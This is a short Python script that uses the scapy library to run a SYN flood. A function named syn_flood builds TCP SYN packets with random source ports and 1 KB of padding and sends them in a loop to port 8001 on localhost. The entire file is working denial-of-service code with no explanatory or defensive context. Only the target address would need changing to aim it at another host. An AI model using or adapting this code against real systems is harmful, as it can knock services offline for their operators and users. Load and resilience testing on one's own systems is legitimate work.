from scapy.all import *

def syn_flood():
    target_ip = "127.0.0.1"
    target_port = 8001
    ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw = Raw(b"X"*1024)
    p = ip / tcp / raw
    send(p, loop=1000, verbose=0)




